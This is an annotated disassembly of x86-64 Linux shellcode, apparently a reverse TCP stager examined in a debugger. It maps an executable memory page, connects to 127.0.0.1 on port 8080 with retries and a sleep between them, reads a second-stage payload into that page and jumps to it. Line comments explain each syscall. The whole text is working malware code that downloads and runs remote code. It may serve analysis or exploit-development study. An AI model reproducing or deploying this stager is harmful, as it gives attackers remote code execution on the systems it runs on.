; clearing out registers
xor    rdi,rdi
;:;:;                ;:;:;
;:;:; Executing MMAP ;:;:;
;:;:;                ;:;:;
; moving 0x9 into rax -> sys_mmap
push   0x9
pop    rax
cdq
; moves 0x1000 into rdx and rsi -> length of copy
mov    dh,0x10
mov    rsi,rdx
; clearing r0
xor    r9,r9
; moving 0x22 (34) into r10 -> flags to mmap
push   0x22
pop    r10
; adds 0x07 into rdx turing it into 0x1007
mov    dl,0x7
; executes systemcall -> mmap
syscall 
;:;:;                  ;:;:;
;:;:; If failed -> JMP ;:;:;
;:;:;                  ;:;:;
; test results of systemcall
test   rax,rax
; jump if failed to exit()
js     0x5555555580b7 <code+119>
; move 0xa (11) into r9
push   0xa
pop    r9
; saving register values to the stack
push   rsi
push   rax
;:;:;                  ;:;:;
;:;:; Executing SOCKET ;:;:;
;:;:;                  ;:;:;
; moving 0x29 into rax -> sys_socket
push   0x29
pop    rax
cdq    
; moving 0x2 into rdi -> int family
push   0x2
pop    rdi
; moving 0x1 into rsi -> int type
push   0x1
pop    rsi
; executing sys_socket
syscall 
;:;:;                  ;:;:;
;:;:; If failed -> JMP ;:;:;
;:;:;                  ;:;:;
; test results of systemcall
test   rax,rax
; jump if failed to exit()
js     0x5555555580b7 <code+119>
; saving results from SOCKET for later
xchg   rdi,rax
;:;:;                   ;:;:;
;:;:; Executing CONNECT ;:;:;
;:;:;                   ;:;:;
; Moving '127.0.0.1' and '8080' into rsi
movabs rcx,0x100007f901f0002
push   rcx
mov    rsi,rsp
; moving 0x10 into rdx
push   0x10
pop    rdx
; moving 0x2a into rax
push   0x2a
pop    rax
; executing sys_connect
syscall 
;:;:;                  ;:;:;
;:;:; If failed -> JMP ;:;:;
;:;:;                  ;:;:;
; test results of systemcall
test   rax,rax
; jump if failed
jns    0x5555555580ab <code+107>
dec    r9
; jump if failed to exit()
je     0x5555555580b7 <code+119>
;:;:;                     ;:;:;
;:;:; Executing NANOSLEEP ;:;:;
;:;:;                     ;:;:;
; moving 0x23 into rax -> sys_nanosleep
push   0x23
pop    rax
; moving timespec struct into rdi, 0x00 into rsi
push   0x0
push   0x5
mov    rdi,rsp
xor    rsi,rsi
; execute sys_nanosleep
syscall
;:;:;                  ;:;:;
;:;:; If failed -> JMP ;:;:;
;:;:;                  ;:;:;
; test results of systemcall
test   rax,rax
; try to entire process again
jns    0x555555558060 <code+32>
; jump if failed to exit()
jmp    0x5555555580b7 <code+119>
;:;:;                ;:;:;
;:;:; Executing READ ;:;:;
;:;:;                ;:;:;
; moving '127.0.0.1' and '8080' into rcx
pop    rcx
; moving 0x00 into rsi and rdx
pop    rsi
pop    rdx
; calling sys_read
syscall
; test results of systemcall
test   rax,rax
; jump if failed to exit()
js     0x5555555580b7 <code+119>
jmp    rsi
;:;:;                ;:;:;
;:;:; Executing EXIT ;:;:;
;:;:;                ;:;:;
 
; moving 0x3c (60) into rax -> sys_exit
push   0x3c
pop    rax
; moving 0x1 into rdi -> exit code 1
push   0x1
pop    rdi
; execute sys_exit
syscall
